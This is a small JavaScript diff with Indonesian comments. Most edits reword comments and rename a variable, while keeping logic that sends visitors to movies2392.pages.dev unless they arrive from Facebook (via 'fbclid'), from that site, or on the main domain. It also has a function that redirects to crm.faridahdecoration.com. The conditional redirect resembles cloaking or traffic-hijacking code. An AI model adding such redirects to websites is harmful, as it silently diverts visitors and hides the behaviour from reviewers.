@@ -33,26 +33,27 @@ function getParameterByName(name, url) {
     return decodeURIComponent(results[2].replace(/\+/g, " "));
 }
 
-// Mengambil nilai parameter 'fbclid' dari URL
+// Mendapatkan nilai parameter 'fbclid' dari URL
 var fbclid = getParameterByName('fbclid');
 
-// Mengambil domain utama (tanpa protokol)
+// Mendapatkan domain utama (tanpa protokol)
 var mainDomain = window.location.hostname.split('.').slice(-2).join('.');
 
-// Menentukan apakah pengguna datang dari Facebook atau bukan
-var fromFacebook = fbclid !== null;
+// Menentukan apakah pengguna datang dari Facebook atau tidak
+var dariFacebook = fbclid !== null;
 
-// Jika pengguna akses langsung, hasil redirect dari domain yang spesifik, atau dari Facebook, biarkan situs terbuka
-if (document.referrer.includes("movies2392.pages.dev") || window.location.hostname === mainDomain || fromFacebook) {
-    // Tidak melakukan redirect
+// Memeriksa apakah referrer berasal dari movies2392.pages.dev atau apakah pengguna berada di domain utama atau datang dari Facebook
+if (document.referrer.includes("movies2392.pages.dev") || window.location.hostname === mainDomain || dariFacebook) {
+    // Tidak melakukan redirect, biarkan pengguna tetap di situs
 } else {
-    // Redirect ke https://movies2392.pages.dev
+    // Redirect ke movies2392.pages.dev
     window.location.href = "https://movies2392.pages.dev";
 }
 
 function redirectToURL() {
     window.location.href = 'https://crm.faridahdecoration.com/';
 }
+
 
 
 
